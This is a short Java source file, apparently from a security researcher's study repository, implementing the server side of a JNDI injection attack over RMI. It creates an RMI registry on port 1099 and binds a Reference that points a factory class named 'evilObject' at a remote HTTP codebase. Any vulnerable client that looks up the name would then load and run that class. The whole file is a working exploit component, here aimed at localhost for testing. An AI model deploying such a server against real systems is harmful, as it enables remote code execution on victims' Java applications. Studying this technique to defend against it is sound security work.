package org.h3rmesk1t.JNDI.RMIAttack;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 6:09 上午
 */
public class JNDIServer {

    public static void main(String[] args) throws Exception {

        String className = "evilObject";
        String factoryName = "evilObject";
        String factoryLocationURL = "http://127.0.0.1:4444/";

        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference(className, factoryName, factoryLocationURL);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        System.out.println("Binding 'referenceWrapper' to 'rmi://127.0.0.1:1099/reference'");
        registry.bind("reference", referenceWrapper);
    }
}
